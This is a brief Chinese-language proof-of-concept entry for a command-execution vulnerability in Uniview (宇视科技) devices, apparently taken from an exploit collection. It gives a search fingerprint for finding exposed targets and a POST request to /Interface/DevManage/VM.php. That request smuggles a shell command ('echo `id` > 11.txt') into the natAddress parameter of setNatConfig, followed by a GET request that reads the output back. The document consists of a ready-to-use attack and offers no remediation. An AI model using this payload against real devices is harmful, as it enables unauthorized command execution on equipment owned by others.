# 宇视科技setNatConfig存在命令执行漏洞

- **系统**：宇视科技　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/Script/Public/Language.js.php"`
- **请求**：`POST /Interface/DevManage/VM.php HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Priority: u=0, i`

**请求体 / payload**
```
cmd=setNatConfig\&natAddress=%26echo%20`id`%20>11.txt
GET /Interface/DevManage/11.txt HTTP/1.1
Host:
```
- **预期**：200　|　—